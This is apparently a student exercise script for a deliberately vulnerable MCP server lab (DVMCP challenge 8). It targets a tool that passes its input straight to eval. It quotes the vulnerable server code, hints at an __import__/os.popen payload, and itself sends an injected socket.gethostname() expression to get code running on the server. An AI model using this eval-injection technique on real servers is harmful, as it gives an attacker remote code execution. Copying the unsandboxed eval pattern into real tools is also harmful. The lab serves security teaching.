"""attack_dvmcp.py — YOUR turn.  DVMCP Challenge 8 · "Malicious Code Execution".

You stood the server up on a Rivanna compute node (see RIVANNA.md). This script
runs in a VS Code terminal on that same node and connects to the server at
127.0.0.1:9008, lists the tools, and confirms the evaluate_expression tool runs
arithmetic. Your job is to turn "evaluate a math expression" into "run my code
in the server process."

Look at the tool on the server:

    @mcp.tool()
    def evaluate_expression(expression: str) -> str:
        result = eval(expression)        # <-- no sandbox
        return f"Result: {result}"

`eval` runs ANY Python expression, not just math. Fill in PAYLOAD below with an
expression that executes a shell command (or imports os) and returns its output
as the value of the expression, then run:

    python real-servers/attack_dvmcp.py            # default: 127.0.0.1:9008 on the node
    python real-servers/attack_dvmcp.py --url URL

Success = Stage B prints a uid=... line, proving `id` ran on the SERVER.
"""

import argparse
import sys

from _mcp_sse import banner, list_tool_names, mcp_session, run, text_of

DEFAULT_URL = "http://127.0.0.1:9008/sse"
TOOL = "evaluate_expression"

# ============================================================================
# YOUR JOB starts here.
# Write a single Python EXPRESSION (no statements, no `import x` line — this is
# eval, not exec) that runs the shell command `id` and evaluates to its output.
# Hint: __import__('module') gives you a module object inside an expression;
#       os.popen(cmd).read() returns a command's stdout as a string.
PAYLOAD = ""   # TODO: e.g. "__import__('???').popen('???').read()"
# YOUR JOB ends here.
# ============================================================================


async def attack(url: str) -> int:
    async with mcp_session(url) as s:
        banner("Recon · what tools does this server expose?")
        names = await list_tool_names(s)
        print("tools:", ", ".join(names))
        if TOOL not in names:
            print(f"✗ no '{TOOL}' tool — is this DVMCP challenge 8 on {url}?")
            return 1

        banner("Stage A · sanity · the tool really evaluates expressions")
        print("expression: 6*7")
        print(text_of(await s.call_tool(TOOL, {"expression": "6*7"})))

        if not PAYLOAD:
            print("\n(!) PAYLOAD is empty — fill it in under 'YOUR JOB' and re-run.")
            return 1

        banner("Stage B · YOUR payload · escalate eval() to code execution")
        print("expression:", PAYLOAD)
        out = text_of(await s.call_tool(TOOL, {"expression": PAYLOAD}))
        print(out)

        banner("Stage C · prove it ran in the SERVER process, not this script")
        host = text_of(await s.call_tool(TOOL, {"expression": "__import__('socket').gethostname()"}))
        print(host)

        print()
        if "uid=" in out:
            print("✓ ATTACK SUCCEEDED — code executed inside the MCP server process.")
            return 0
        print("✗ no uid= yet — your PAYLOAD didn't run `id`. Re-read the hint.")
        return 1


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default=DEFAULT_URL, help="MCP SSE endpoint")
    return run(attack(ap.parse_args().url))


if __name__ == "__main__":
    sys.exit(main())
